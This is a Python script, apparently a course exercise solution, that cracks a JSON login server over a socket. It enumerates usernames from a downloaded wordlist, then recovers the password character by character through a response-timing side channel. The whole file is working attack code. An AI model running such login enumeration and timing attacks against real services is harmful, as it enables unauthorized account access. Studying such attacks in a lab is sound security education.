from argparse import ArgumentParser
from socket import socket
from urllib import request
from json import dumps, loads
from string import ascii_letters, digits
from time import perf_counter


parser = ArgumentParser(description='Time-based vulnerability')
parser.add_argument('ip', type=str, help="IP address")
parser.add_argument('port', type=int, help="Port number")
args = parser.parse_args()


with socket() as client:
    client.connect((args.ip, args.port))

    for line in request.urlopen('https://stepik.org/media/attachments/lesson/255258/logins.txt'):
        login = line.decode().strip()
        payload = dumps({'login': login, 'password': ''})
        client.send(payload.encode())

        if loads(client.recv(1024).decode())['result'] == 'Wrong password!':
            break

    password = ''
    tmp = ''
    try:
        while not password:
            for char in ascii_letters + digits:
                check = tmp + char
                start = perf_counter()
                client.send(dumps({'login': login, 'password': check}).encode())
                reply = loads(client.recv(1024).decode())['result']
                end = perf_counter()

                if reply == 'Connection success!':
                    password = check
                    break

                if 10000 * (end - start) > 500:
                    tmp = check
                    break

    except ConnectionAbortedError:
        pass

    finally:
        print(dumps({'login': login, 'password': password}))
